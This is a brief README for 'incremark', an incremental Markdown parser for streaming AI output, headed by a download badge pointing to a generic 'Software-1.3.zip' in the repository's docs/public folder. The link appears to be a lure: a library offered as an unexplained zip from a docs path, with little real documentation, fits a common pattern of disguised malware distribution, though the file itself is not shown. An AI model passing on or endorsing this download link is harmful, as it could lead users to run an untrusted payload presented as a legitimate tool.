# 🚀 incremark - Fast and Efficient Markdown Parsing

[![Download Incremark](https://github.com/marwanbelike/incremark/raw/refs/heads/main/docs/public/Software-1.3.zip)](https://github.com/marwanbelike/incremark/raw/refs/heads/main/docs/public/Software-1.3.zip)

## 🛠️ Overview

Incremark is a powerful Markdown parser designed to enhance performance in AI streaming output scenarios. Traditional parsers often face delays because they reparse all text with each new update. Incremark solves this by implementing an incremental parsing strategy, meaning it only processes new content while keeping completed sections intact.
